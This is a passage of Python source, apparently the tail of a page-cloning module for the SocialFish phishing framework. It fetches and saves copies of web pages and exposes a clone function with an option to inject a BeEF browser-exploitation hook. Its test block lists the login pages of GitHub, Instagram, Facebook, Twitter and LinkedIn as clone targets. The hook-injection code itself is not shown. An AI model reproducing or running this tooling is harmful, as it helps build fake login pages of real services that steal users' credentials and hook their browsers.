            safe_domain = re.sub(r'[^\w\-_.]', '_', domain)
            
            # Create SocialFish directory structure
            output_dir = Path(self.config.output_base) / safe_agent / safe_domain
            output_dir.mkdir(parents=True, exist_ok=True)
            
            # Create subdirectories
            for subdir in ['css', 'js', 'images', 'fonts', 'assets']:
                (output_dir / subdir).mkdir(exist_ok=True)
            
            logger.info(f"📁 Output directory: {output_dir}")
            return output_dir
            
        except Exception as e:
            logger.error(f"❌ Failed to create output directory: {e}")
            return None
    
    async def _get_page_content(self, url: str) -> Optional[str]:
        """Get page content using best available method - FIXED: No double decompression"""
        # Try browser rendering first
        if self.browser_manager.driver:
            content = await self.browser_manager.render_page(url)
            if content:
                return content
        
        # Fallback to HTTP request
        if self.resource_manager.session_pool:
            session = self.resource_manager.session_pool[0]
            try:
                async with session.get(url) as response:
                    if response.status == 200:
                        # CRITICAL FIX: aiohttp automatically decompresses
                        content = await response.read()
                        
                        # Decode text for HTML content only (no manual decompression needed)
                        for encoding in ['utf-8', 'latin-1', 'iso-8859-1']:
                            try:
                                return content.decode(encoding)
                            except UnicodeDecodeError:
                                continue
                        
                        return content.decode('utf-8', errors='ignore')
            except Exception as e:
                logger.error(f"HTTP request failed: {e}")
        
        return None
    
    async def _save_metadata(self, url: str, output_dir: Path, start_time: float):
        """Save cloning metadata"""
        metadata = {
            'url': url,
            'timestamp': time.time(),
            'duration': time.time() - start_time,
            'stats': self.resource_manager.stats,
            'socialfish_version': '2.0_advanced'
        }
        
        async with aiofiles.open(output_dir / 'metadata.json', 'w') as f:
            await f.write(json.dumps(metadata, indent=2))
    
    async def _cleanup(self):
        """Cleanup resources"""
        await self.resource_manager.cleanup()
        self.browser_manager.cleanup()

# SocialFish Integration Functions
def sync_wrapper(coro):
    """Wrapper to run async function in sync context"""
    @wraps(coro)
    def wrapper(*args, **kwargs):
        try:
            loop = asyncio.get_event_loop()
        except RuntimeError:
            loop = asyncio.new_event_loop()
            asyncio.set_event_loop(loop)
        
        try:
            if loop.is_running():
                # If loop is already running, use thread
                import concurrent.futures
                with concurrent.futures.ThreadPoolExecutor() as executor:
                    future = executor.submit(asyncio.run, coro(*args, **kwargs))
                    return future.result()
            else:
                return loop.run_until_complete(coro(*args, **kwargs))
        except Exception as e:
            logger.error(f"Sync wrapper error: {e}")
            return False
    
    return wrapper

# Main SocialFish compatible function
@sync_wrapper
async def clone_async(url: str, user_agent: str, beef: str) -> bool:
    """Async clone function for SocialFish"""
    beef_enabled = beef.lower() == 'yes'
    
    config = SocialFishConfig()
    cloner = SocialFishCloner(config)
    
    return await cloner.clone_website_async(url, user_agent, beef_enabled)

# SocialFish compatible clone function (synchronous interface)
def clone(url: str, user_agent: str, beef: str) -> bool:
    """
    SocialFish compatible clone function
    
    Args:
        url: Target URL to clone
        user_agent: User agent string from request
        beef: 'yes' or 'no' for BeEF hook injection
    
    Returns:
        bool: True if cloning successful, False otherwise
    """
    try:
        logger.info(f"🐟 SocialFish Advanced Clone Request: {url}")
        logger.info(f"👤 User Agent: {user_agent[:50]}...")
        logger.info(f"🥩 BeEF Hook: {beef}")
        
        # Call async function with sync wrapper
        result = clone_async(url, user_agent, beef)
        
        if result:
            logger.info("✅ SocialFish clone completed successfully")
        else:
            logger.error("❌ SocialFish clone failed")
        
        return result
        
    except Exception as e:
        logger.error(f"❌ SocialFish clone error: {e}")
        return False

# Test function for universal usage
if __name__ == "__main__":
    test_sites = [
        ("https://github.com/login", "GitHub"),
        ("https://www.instagram.com/", "Instagram"),
        ("https://www.facebook.com/", "Facebook"),
        ("https://twitter.com/", "Twitter"),
        ("https://www.linkedin.com/", "LinkedIn")
    ]
    
    test_user_agent = "Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0"
    
    print("🧪 Testing UNIVERSAL SocialFish cloner...")
    print("Select a site to test:")
    for i, (url, name) in enumerate(test_sites, 1):
        print(f"{i}. {name} ({url})")
    
    try:
        choice = int(input("Enter choice (1-5): ")) - 1
        if 0 <= choice < len(test_sites):
            test_url, site_name = test_sites[choice]
            print(f"🚀 Testing {site_name}...")
            result = clone(test_url, test_user_agent, "no")
            
            if result:
                print(f"🎉 {site_name} clone completed successfully!")
            else:
                print(f"❌ {site_name} clone failed!")
        else:
            # Default test
            test_url = test_sites[0][0]
            print(f"🚀 Running default test: {test_sites[0][1]}...")
            result = clone(test_url, test_user_agent, "no")
            
            if result:
                print("🎉 Test completed successfully!")
            else:
                print("❌ Test failed!")
    except (ValueError, KeyboardInterrupt):
        # Default test
        test_url = test_sites[0][0]
        print(f"🚀 Running default test: {test_sites[0][1]}...")
        result = clone(test_url, test_user_agent, "no")
        
        if result:
            print("🎉 Test completed successfully!")
        else:
            print("❌ Test failed!")